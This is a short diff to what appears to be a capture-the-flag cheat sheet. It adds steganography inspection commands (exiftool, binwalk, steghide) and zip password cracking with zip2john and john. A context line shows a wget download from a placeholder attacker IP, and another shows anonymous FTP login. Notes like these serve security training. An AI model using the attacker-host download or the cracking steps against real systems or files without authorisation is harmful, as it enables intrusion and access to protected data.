@@ -71,3 +71,19 @@ wget http://<attack-ip>:8080/file
 # Login without password to FTP
 - User:  `anonymous`
 
+# Investigate image metadata (Stego)
+- Use command `file image.png`
+- Use command `exiftool image.png`
+- Use command `xxd image.png`
+- Use command `strings image.png`
+- Use tool binwalk to search binary images for embedded files and executable code: `binwalk image.png`
+	- To extract the file: `binwalk -e image.png`
+- Use command: `steghide extract -sf image.png`
+
+# Crack zip files
+- First get the hash: `zip2john file.zip > hash`
+- Then use command: `john --wordlist=/path/to/wordlist hash`
+
+# Extract from cli
+- Use command: `7z e file.zip`
+
